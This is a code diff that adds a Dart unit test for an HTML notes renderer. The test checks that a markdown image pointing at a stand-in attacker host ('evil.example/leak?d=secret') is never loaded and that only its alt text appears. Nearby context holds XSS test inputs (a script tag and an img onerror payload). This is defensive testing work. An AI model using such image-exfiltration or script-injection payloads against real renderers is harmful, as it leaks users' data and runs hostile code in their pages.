@@ -148,6 +148,17 @@ void main() {
       expect('<h1>'.allMatches(page), hasLength(1)); // the title once, from the meta
     });
 
+    test('an image in a note is never loaded: its alt text shows instead (#311)', () {
+      final note = fixture('mopsos.md').replaceFirst(
+        'Set up CI',
+        '![the chart](https://evil.example/leak?d=secret) and ![](http://x.example/p.png)',
+      );
+      final page = notesHtml('x', [note]);
+      expect(page, isNot(contains('<img')));
+      expect(page, isNot(contains('evil.example')));
+      expect(page, contains('the chart'));
+    });
+
     test('markup inside a note is shown, never run', () {
       final note = fixture('mopsos.md')
           .replaceFirst('Set up CI', '<script>alert(1)</script> <img src=x onerror=alert(2)>');
